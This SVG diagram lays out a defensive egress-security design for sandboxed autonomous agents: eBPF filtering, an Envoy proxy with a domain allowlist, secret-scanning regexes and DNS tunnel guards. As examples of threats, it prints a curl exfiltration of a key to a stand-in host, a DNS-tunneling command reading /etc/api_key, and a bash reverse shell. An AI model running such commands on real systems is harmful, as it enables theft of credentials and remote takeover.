<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 960 500" width="100%" height="100%"
     font-family="Helvetica Neue, Helvetica, Arial, sans-serif">
  <defs>
    <!-- Arrowhead markers -->
    <marker id="arr-blue" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#0284c7"/>
    </marker>
    <marker id="arr-green" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#16a34a"/>
    </marker>
    <marker id="arr-orange" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#d97706"/>
    </marker>
    <marker id="arr-purple" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#7c3aed"/>
    </marker>
    <marker id="arr-red" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#dc2626"/>
    </marker>
    <marker id="arr-gray" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto">
      <path d="M0,0 L8,3 L0,6 Z" fill="#64748b"/>
    </marker>
  </defs>

  <!-- Clean White Canvas -->
  <rect width="960" height="500" fill="#ffffff"/>
  <g transform="translate(0, -40)">


  <!-- Outer Architecture Boundary -->

  <!-- ================================================================= -->
  <!-- STEP 1: UNTRUSTED SANDBOX CODE (LEFT)                             -->
  <!-- ================================================================= -->
  <g transform="translate(40, 74)">
    <rect width="205" height="384" rx="2" fill="#ffffff" stroke="#dc2626" stroke-width="1.2"/>
    <rect width="205" height="24" rx="2" fill="#fee2e2" stroke="#dc2626" stroke-width="1.2"/>
    <text x="12" y="16" font-size="9.5" font-weight="700" fill="#991b1b">UNTRUSTED SANDBOX CODE</text>

    <!-- Legitimate Request -->
    <g transform="translate(8, 32)">
      <rect width="189" height="66" rx="1" fill="#f8fafc" stroke="#16a34a" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#15803d">Legitimate Dependency Fetch</text>
      <rect x="6" y="20" width="177" height="38" rx="1" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="10" y="34" font-family="monospace" font-size="8.0" fill="#15803d">pip install pytest requests</text>
      <text x="10" y="48" font-family="monospace" font-size="8.0" fill="#475569">Target: https://pypi.org</text>
    </g>

    <!-- Exfiltration Threat 1: Direct HTTP POST -->
    <g transform="translate(8, 104)">
      <rect width="189" height="84" rx="1" fill="#f8fafc" stroke="#dc2626" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#991b1b">Threat 1: HTTP Secret Exfiltration</text>
      <text x="8" y="26" font-size="8.0" fill="#7f1d1d">Adversary injects cURL command</text>
      <rect x="6" y="32" width="177" height="46" rx="1" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="10" y="44" font-family="monospace" font-size="8.0" fill="#dc2626">curl -X POST https://evil-c2.com</text>
      <text x="10" y="56" font-family="monospace" font-size="8.0" fill="#dc2626">  -d "k=AKIAIOSFODNN7EXAMPLE"</text>
      <text x="10" y="68" font-family="monospace" font-size="8.0" fill="#7f1d1d">  --header "Content-Type: text"</text>
    </g>

    <!-- Exfiltration Threat 2: DNS Tunneling -->
    <g transform="translate(8, 194)">
      <rect width="189" height="84" rx="1" fill="#f8fafc" stroke="#dc2626" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#991b1b">Threat 2: DNS Covert Tunneling</text>
      <text x="8" y="26" font-size="8.0" fill="#7f1d1d">Encodes tokens into DNS queries</text>
      <rect x="6" y="32" width="177" height="46" rx="1" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="10" y="44" font-family="monospace" font-size="8.0" fill="#dc2626">token=$(cat /etc/api_key)</text>
      <text x="10" y="56" font-family="monospace" font-size="8.0" fill="#dc2626">dig $token.evil-tunnel.org</text>
      <text x="10" y="68" font-family="monospace" font-size="8.0" fill="#7f1d1d">Bypasses standard TCP firewalls!</text>
    </g>

    <!-- Threat 3: Direct Raw IP Connection -->
    <g transform="translate(8, 284)">
      <rect width="189" height="86" rx="1" fill="#f8fafc" stroke="#dc2626" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#991b1b">Threat 3: Direct Reverse Shell</text>
      <rect x="6" y="20" width="177" height="44" rx="1" fill="#ffffff" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="10" y="34" font-family="monospace" font-size="8.0" fill="#dc2626">bash -i &gt;&amp; /dev/tcp/198.51.100.1</text>
      <text x="10" y="46" font-family="monospace" font-size="8.0" fill="#dc2626">  /4444 0&gt;&amp;1 (Raw TCP IP socket)</text>
      <text x="10" y="57" font-family="monospace" font-size="8.0" fill="#7f1d1d">Reverse shell directly to C2 host</text>
      <rect x="6" y="68" width="177" height="14" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
      <text x="94" y="79" font-size="8.0" font-weight="700" fill="#991b1b" text-anchor="middle">CONTAINED IN KERNEL</text>
    </g>
  </g>

  <!-- ================================================================= -->
  <!-- STEP 2: LAYER 1 - KERNEL / EBPF PACKET FILTERING                  -->
  <!-- ================================================================= -->
  <g transform="translate(261, 74)">
    <rect width="195" height="384" rx="2" fill="#ffffff" stroke="#0284c7" stroke-width="1.2"/>
    <rect width="195" height="24" rx="2" fill="#e0f2fe" stroke="#0284c7" stroke-width="1.2"/>
    <text x="12" y="16" font-size="9.5" font-weight="700" fill="#0369a1">LAYER 1: KERNEL EBPF FILTER</text>

    <g transform="translate(8, 32)">
      <rect width="179" height="98" rx="1" fill="#f8fafc" stroke="#0284c7" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0369a1">1. Namespace Routing</text>
      <text x="8" y="27" font-size="8.0" fill="#334155">• Isolated Net Namespace</text>
      <text x="8" y="39" font-size="8.0" fill="#334155">• No default host gateway route</text>
      <text x="8" y="51" font-size="8.0" fill="#334155">• All traffic steered to virtual</text>
      <text x="8" y="63" font-family="monospace" font-size="8.0" fill="#0284c7">  veth0 / tap0 interface</text>
      <rect x="6" y="72" width="167" height="20" rx="1" fill="#e0f2fe" stroke="#bae6fd" stroke-width="0.8"/>
      <text x="89" y="86" font-size="8.0" font-weight="700" fill="#0369a1" text-anchor="middle">Traffic Bound to Proxy</text>
    </g>

    <g transform="translate(8, 136)">
      <rect width="179" height="110" rx="1" fill="#f8fafc" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0f172a">2. Raw IP Packet Drop</text>
      <text x="8" y="27" font-size="8.0" fill="#475569">• eBPF TC filter attached</text>
      <text x="8" y="39" font-size="8.0" fill="#475569">• Checks destination IP format</text>
      <text x="8" y="51" font-size="8.0" fill="#dc2626">• Direct numeric IPs blocked:</text>
      <text x="8" y="63" font-family="monospace" font-size="8.0" fill="#b91c1c">  198.51.100.1 → TC_ACT_SHOT</text>
      <rect x="6" y="74" width="167" height="28" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
      <text x="89" y="87" font-size="8.0" font-weight="700" fill="#991b1b" text-anchor="middle">Reverse Shell Defeated</text>
      <text x="89" y="97" font-size="8.0" fill="#7f1d1d" text-anchor="middle">Zero direct socket egress</text>
    </g>

    <g transform="translate(8, 252)">
      <rect width="179" height="118" rx="1" fill="#f8fafc" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0f172a">3. Port Enforcement</text>
      <text x="8" y="27" font-size="8.0" fill="#475569">• Allowed: 443 (HTTPS),</text>
      <text x="8" y="39" font-size="8.0" fill="#475569">  53 (DNS via proxy only)</text>
      <text x="8" y="51" font-size="8.0" fill="#dc2626">• Blocked: 22, 25, 3389,</text>
      <text x="8" y="63" font-size="8.0" fill="#dc2626">  6667 (IRC), 8080</text>
      <rect x="6" y="74" width="167" height="34" rx="1" fill="#fef3c7" stroke="#fde68a" stroke-width="0.8"/>
      <text x="89" y="88" font-size="8.0" font-weight="700" fill="#b45309" text-anchor="middle">C2 Mining Pool Defense</text>
      <text x="89" y="100" font-size="8.0" fill="#78350f" text-anchor="middle">No arbitrary outbound ports</text>
    </g>
  </g>

  <!-- ================================================================= -->
  <!-- STEP 3: LAYER 2 - TRANSPARENT EGRESS PROXY (MIDDLE)               -->
  <!-- ================================================================= -->
  <g transform="translate(472, 74)">
    <rect width="230" height="384" rx="2" fill="#ffffff" stroke="#7c3aed" stroke-width="1.2"/>
    <rect width="230" height="24" rx="2" fill="#ede9fe" stroke="#7c3aed" stroke-width="1.2"/>
    <text x="12" y="16" font-size="9.5" font-weight="700" fill="#6d28d9">LAYER 2: TRANSPARENT PROXY (ENVOY)</text>

    <!-- Subcomponent A: TLS SNI Whitelisting -->
    <g transform="translate(8, 32)">
      <rect width="214" height="114" rx="1" fill="#f8fafc" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0f172a">A. SNI &amp; Host Domain Allowlist</text>
      <text x="8" y="26" font-size="8.0" fill="#475569">Extracts SNI before TLS handshake:</text>

      <rect x="6" y="32" width="202" height="34" rx="1" fill="#dcfce7" stroke="#86efac" stroke-width="0.8"/>
      <text x="10" y="45" font-family="monospace" font-size="8.0" fill="#15803d">MATCH: *.pypi.org, *.github.com</text>
      <text x="10" y="57" font-size="8.0" font-weight="700" fill="#15803d">ACTION: Pass Through Allowed</text>

      <rect x="6" y="70" width="202" height="36" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
      <text x="10" y="83" font-family="monospace" font-size="8.0" fill="#b91c1c">MATCH: evil-c2.com (Unlisted)</text>
      <text x="10" y="97" font-size="8.0" font-weight="700" fill="#dc2626">ACTION: 403 Forbidden + Kill Sandbox</text>
    </g>

    <!-- Subcomponent B: Payload Regex & Secret Redaction -->
    <g transform="translate(8, 152)">
      <rect width="214" height="116" rx="1" fill="#f8fafc" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0f172a">B. Outbound Secret &amp; Token Scanner</text>
      <text x="8" y="26" font-size="8.0" fill="#475569">Deep packet inspection on body payloads:</text>

      <rect x="6" y="32" width="202" height="44" rx="1" fill="#fef3c7" stroke="#fde68a" stroke-width="0.8"/>
      <text x="10" y="44" font-family="monospace" font-size="8.0" fill="#b45309">AWS Key:  AKIA[0-9A-Z]{16}</text>
      <text x="10" y="56" font-family="monospace" font-size="8.0" fill="#b45309">GitHub:   ghp_[0-9a-zA-Z]{36}</text>
      <text x="10" y="68" font-family="monospace" font-size="8.0" fill="#b45309">PrivKey:  -----BEGIN RSA PRIVATE...</text>

      <rect x="6" y="80" width="202" height="28" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
      <text x="107" y="93" font-size="8.0" font-weight="700" fill="#991b1b" text-anchor="middle">Data Exfiltration Blocked!</text>
      <text x="107" y="103" font-size="8.0" fill="#7f1d1d" text-anchor="middle">Secret dropped before reaching network</text>
    </g>

    <!-- Subcomponent C: DNS Tunnel Mitigation -->
    <g transform="translate(8, 274)">
      <rect width="214" height="96" rx="1" fill="#f8fafc" stroke="#cbd5e1" stroke-width="0.8"/>
      <text x="8" y="14" font-size="8.5" font-weight="700" fill="#0f172a">C. DNS Tunneling &amp; Sinkhole Guard</text>
      <text x="8" y="26" font-size="8.0" fill="#475569">• Restricts query length: &lt; 50 chars</text>
      <text x="8" y="37" font-size="8.0" fill="#475569">• High-entropy Shannon label filter</text>
      <text x="8" y="48" font-size="8.0" fill="#475569">• DNS requests routed to internal resolver</text>
      <rect x="6" y="54" width="202" height="34" rx="1" fill="#e0f2fe" stroke="#bae6fd" stroke-width="0.8"/>
      <text x="107" y="68" font-family="monospace" font-size="8.0" fill="#0369a1" text-anchor="middle">dig $token.evil.org → NXDOMAIN</text>
      <text x="107" y="80" font-size="8.0" font-weight="700" fill="#0369a1" text-anchor="middle">Attacker nameserver receives 0 bytes</text>
    </g>
  </g>

  <!-- ================================================================= -->
  <!-- STEP 4: DESTINATIONS (RIGHT)                                      -->
  <!-- ================================================================= -->
  <g transform="translate(718, 74)">
    <rect width="202" height="384" rx="2" fill="#ffffff" stroke="#64748b" stroke-width="1.2"/>
    <rect width="202" height="24" rx="2" fill="#f1f5f9" stroke="#64748b" stroke-width="1.2"/>
    <text x="12" y="16" font-size="9.5" font-weight="700" fill="#334155">EGRESS DESTINATION VERDICT</text>

    <!-- Allowed Destination -->
    <g transform="translate(8, 32)">
      <rect width="186" height="150" rx="1" fill="#ffffff" stroke="#16a34a" stroke-width="1.2"/>
      <rect width="186" height="24" rx="1" fill="#dcfce7" stroke="#16a34a" stroke-width="1.2"/>
      <circle cx="16" cy="12" r="4" fill="#16a34a"/>
      <text x="26" y="16" font-size="8.5" font-weight="700" fill="#15803d">ALLOWED DESTINATIONS</text>

      <g transform="translate(8, 30)">
        <text x="0" y="12" font-family="monospace" font-size="8.0" font-weight="700" fill="#15803d">pypi.org / files.python...</text>
        <text x="0" y="23" font-size="8.0" fill="#475569">Python package installation</text>

        <text x="0" y="42" font-family="monospace" font-size="8.0" font-weight="700" fill="#15803d">api.github.com</text>
        <text x="0" y="53" font-size="8.0" fill="#475569">Authorized git remote repository</text>

        <text x="0" y="72" font-family="monospace" font-size="8.0" font-weight="700" fill="#15803d">registry.npmjs.org</text>
        <text x="0" y="83" font-size="8.0" fill="#475569">Node package dependencies</text>

        <rect x="0" y="92" width="170" height="20" rx="1" fill="#dcfce7" stroke="#86efac" stroke-width="0.8"/>
        <text x="85" y="106" font-size="8.0" font-weight="700" fill="#15803d" text-anchor="middle">HTTP 200 OK • Clean Pipeline</text>
      </g>
    </g>

    <!-- Blocked Destination -->
    <g transform="translate(8, 188)">
      <rect width="186" height="182" rx="1" fill="#ffffff" stroke="#dc2626" stroke-width="1.2"/>
      <rect width="186" height="24" rx="1" fill="#fee2e2" stroke="#dc2626" stroke-width="1.2"/>
      <circle cx="16" cy="12" r="4" fill="#dc2626"/>
      <text x="26" y="16" font-size="8.5" font-weight="700" fill="#991b1b">BLOCKED DESTINATIONS</text>

      <g transform="translate(8, 30)">
        <text x="0" y="12" font-family="monospace" font-size="8.0" font-weight="700" fill="#b91c1c">evil-c2.com (Malicious Host)</text>
        <text x="0" y="23" font-size="8.0" fill="#7f1d1d">SNI violation → Reset connection</text>

        <text x="0" y="42" font-family="monospace" font-size="8.0" font-weight="700" fill="#b91c1c">198.51.100.1:4444</text>
        <text x="0" y="53" font-size="8.0" fill="#7f1d1d">Raw IP / Port → eBPF drop</text>

        <text x="0" y="72" font-family="monospace" font-size="8.0" font-weight="700" fill="#b91c1c">*.evil-tunnel.org</text>
        <text x="0" y="83" font-size="8.0" fill="#7f1d1d">DNS exfil tunnel → Sinkholed</text>

        <rect x="0" y="94" width="170" height="48" rx="1" fill="#fee2e2" stroke="#fca5a5" stroke-width="0.8"/>
        <text x="85" y="112" font-size="8.0" font-weight="700" fill="#991b1b" text-anchor="middle">SECURITY ALERT EMITTED</text>
        <text x="85" y="128" font-size="8.0" fill="#7f1d1d" text-anchor="middle">Agent Trajectory Killed Immediately</text>
      </g>
    </g>
  </g>

  <!-- ================================================================= -->
  <!-- CONNECTORS BETWEEN COLUMNS                                        -->
  <!-- ================================================================= -->
  <line x1="245" y1="130" x2="259" y2="130" stroke="#16a34a" stroke-width="1.8" marker-end="url(#arr-green)"/>
  <line x1="245" y1="210" x2="259" y2="210" stroke="#dc2626" stroke-width="1.8" marker-end="url(#arr-red)"/>
  <line x1="245" y1="340" x2="259" y2="340" stroke="#dc2626" stroke-width="1.8" marker-end="url(#arr-red)"/>

  <line x1="456" y1="130" x2="470" y2="130" stroke="#16a34a" stroke-width="1.8" marker-end="url(#arr-green)"/>
  <line x1="456" y1="220" x2="470" y2="220" stroke="#dc2626" stroke-width="1.8" marker-end="url(#arr-red)"/>

  <line x1="702" y1="140" x2="716" y2="140" stroke="#16a34a" stroke-width="1.8" marker-end="url(#arr-green)"/>
  <line x1="702" y1="310" x2="716" y2="310" stroke="#dc2626" stroke-width="1.8" marker-end="url(#arr-red)"/>

  <!-- ================================================================= -->
  <!-- FOOTER: ZERO TRUST NETWORK INVARIANT                              -->
  <!-- ================================================================= -->
  <g transform="translate(40, 468)">
    <rect width="880" height="42" rx="2" fill="#ffffff" stroke="#94a3b8" stroke-width="1.2"/>
    <text x="14" y="16" font-size="8.5" font-weight="700" fill="#0f172a">ZERO TRUST NETWORK INVARIANT FOR AUTONOMOUS AGENTS:</text>
    <text x="14" y="28" font-size="8.0" fill="#334155">1. Never grant an autonomous agent direct internet access. Untrusted code can exfiltrate sensitive tokens or install command-and-control (C2) payloads.</text>
    <text x="14" y="38" font-size="8.0" fill="#334155">2. Strict egress proxying (SNI allowlist + secret regex redaction + DNS sinkholing) turns unauthorized exfiltration attempts into immediate containment triggers.</text>
  </g>
</g>
</svg>